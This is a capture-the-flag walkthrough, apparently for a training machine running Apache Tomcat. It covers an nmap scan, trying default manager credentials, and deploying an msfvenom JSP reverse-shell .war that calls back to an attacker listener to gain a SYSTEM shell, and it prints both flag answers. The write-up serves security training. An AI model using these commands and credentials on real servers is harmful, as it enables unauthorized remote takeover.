
Task 1 : Which TCP port is open on the remote host?

<br>

Run an nmap scan for given IP address

```
sudo nmap -sV -Pn -T4 -oA initial_scan 10.129.136.9
```

<br>
<img width="779" height="191" alt="Pasted image 20260216003010" src="https://github.com/user-attachments/assets/e8e84015-0afc-439c-8686-b06f9fe1dd6b" />
<br>
<br>
<br>
    
Answer : 8080

---

Task 2 : Which web server is running on the remote host? Looking for two words.

<br>

<img width="779" height="191" alt="Pasted image 20260216002941" src="https://github.com/user-attachments/assets/cf595502-9537-4053-8dcf-8705102b1d94" />
<br>
<br>
<br>

Answer : Apache Tomcat

---

Task 3 : Which relative path on the webserver leads to the Web Application Manager?

<br>

<img width="808" height="231" alt="Pasted image 20260216003800" src="https://github.com/user-attachments/assets/7b525974-0ba0-4362-9ca0-5e844c54597a" />
<br>
<br>
<br>

Answer : /manager/html

---

Task 4 : What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password

Tried some default credentials for Tomcat Apache such as :

<br>

admin:admin
administrator:administrator
admin:(none)
tomcat:Tomcatadm

<br>

None of them worked.

<br>

<img width="1180" height="400" alt="Pasted image 20260216004048" src="https://github.com/user-attachments/assets/a357c142-eb83-4e4c-abbd-04a298f9dfb8" />



<br>
Upon closer inspection of the error page, a suggested default credential of "tomcat:s3cret" can be seen.

<img width="1922" height="1047" alt="Screenshot_2026-02-15_11-41-38" src="https://github.com/user-attachments/assets/a838aa70-d863-4592-83c3-731246f1b38b" />


<br>

These credentials work and Tomcat Web Application Manager can be accessed.

<br>
<br>


Answer : tomcat:s3cret

---

Task 5 : Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?

<br>


<img width="1082" height="304" alt="Pasted image 20260216004329" src="https://github.com/user-attachments/assets/056203f6-6396-4d42-a3b2-654bfebec8b9" />

<br>
<br>

Tomcat Apache allows .war files to be uploaded
<br>

Answer : war

---

Task 6 : Submit the flag located on the user's desktop.

Task 7 : Submit the flag located on the administrator's desktop.

Both flags are given together so I will do them simultaneously.

Craft an msfvenom .war reverse shell payload that can be deployed onto the server.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.37 LPORT=4444 -f war > reverse.war
```
<img width="789" height="110" alt="Pasted image 20260216004825" src="https://github.com/user-attachments/assets/09f6190c-52e0-431e-b9e0-b6092af4fd64" />

Next, open a netcat listener to catch the reverse connection

```
nc -lvnp 4444
```
<img width="409" height="60" alt="Pasted image 20260216004736" src="https://github.com/user-attachments/assets/d8d9323a-9b57-4fa0-abfd-cc06e369228e" />

With the crafted msfvenom payload, browse and deploy the .war file.

<img width="1041" height="285" alt="Pasted image 20260216005025" src="https://github.com/user-attachments/assets/a5a71998-a488-48dc-b9e0-7358d226398e" />

<img width="1157" height="403" alt="Pasted image 20260216005045" src="https://github.com/user-attachments/assets/8309f04b-97ac-4701-addc-21133f567b28" />

Finally, our reverse shell payload is uploaded.

<img width="1904" height="471" alt="Pasted image 20260216005204" src="https://github.com/user-attachments/assets/7d6d9a9c-cae8-4147-a1b1-6593d051dfe3" />

<img width="629" height="168" alt="Pasted image 20260216005349" src="https://github.com/user-attachments/assets/3e4a0cb5-b1f0-4cd1-be59-f912ebd88258" />

Looking at our attacker machine, our netcat catches a reverse connection.

We achieve a reverse shell connection as nt authority\system

<img width="620" height="151" alt="Pasted image 20260216005537" src="https://github.com/user-attachments/assets/cb851795-88a1-47b4-aa3e-0b9c3fe12b97" />

The flag can be found at C:\Users\Administrator\Desktop\flags\

Answer : 

User flag 
```
7004dbcef0f854e0fb401875f26ebd00
```

Root Flag
```
04a8b36e1545a455393d067e772fe90e
```



